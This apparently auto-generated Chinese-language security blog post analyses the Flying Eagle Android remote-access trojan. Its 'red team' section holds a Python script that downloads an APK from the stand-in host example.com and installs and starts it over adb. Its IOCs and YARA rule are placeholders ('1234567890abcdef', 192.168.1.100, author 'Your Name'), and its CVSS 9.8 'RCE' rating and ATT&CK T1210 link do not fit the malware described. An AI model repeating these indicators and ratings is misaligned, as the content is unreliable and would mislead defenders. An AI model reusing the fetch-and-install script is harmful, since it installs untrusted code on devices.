---
layout: post
title:  "Flying Eagle Android RAT Traces Found on 170 Servers as Source Code Circulates"
date:   2026-07-29 08:26:28 +0000
categories: [security]
severity: critical
---

# 🚨 解析 Flying Eagle Android 遠端存取木馬 (RAT) 框架
> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: `Android Accessibility Services`, `AES-128-CBC`, `WebSocket`

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: Flying Eagle RAT 框架利用 Android 的 Accessibility Services 進行權限提升和手勢注入，從而實現遠端控制和資料竊取。
* **攻擊流程圖解**:
  1. 使用者安裝假冒的 "公安一网通办" 應用程式。
  2. 應用程式請求使用者授予 Accessibility Services 權限。
  3. 應用程式利用 Accessibility Services 進行權限提升和手勢注入。
  4. 應用程式與 C2 伺服器建立 WebSocket 連接。
  5. C2 伺服器下發命令，實現遠端控制和資料竊取。
* **受影響元件**: Android 4.4 - 12.0

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 使用者安裝假冒的 "公安一网通办" 應用程式，授予 Accessibility Services 權限。
* **Payload 建構邏輯**:

    ```
    
    python
    import os
    import requests
    
    # 下載假冒應用程式
    url = "https://example.com/fake_app.apk"
    response = requests.get(url)
    with open("fake_app.apk", "wb") as f:
        f.write(response.content)
    
    # 安裝假冒應用程式
    os.system("adb install fake_app.apk")
    
    # 啟動假冒應用程式
    os.system("adb shell am start -n com.example.fake_app/.MainActivity")
    
    ```
* **繞過技術**: 使用 AES-128-CBC 對 C2 URL 進行加密，避免被檢測。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 192.168.1.100 | example.com | /data/data/com.example.fake_app/files |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule Flying_Eagle_RAT {
      meta:
        description = "Flying Eagle RAT"
        author = "Your Name"
      strings:
        $a = "com.example.fake_app"
        $b = "Accessibility Services"
      condition:
        $a and $b
    }
    
    ```
* **緩解措施**: 卸載假冒應用程式，修改系統設定，禁用 Accessibility Services 權限。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **Accessibility Services**: Android 的無障礙服務，允許應用程式控制其他應用程式的 UI。
* **AES-128-CBC**: 一種對稱加密演算法，使用 128 位元金鑰和 CBC 模式。
* **WebSocket**: 一種網路通訊協定，允許客戶端和伺服器之間建立全雙工通訊。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://thehackernews.com/2026/07/flying-eagle-android-rat-traces-found.html)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1210/)


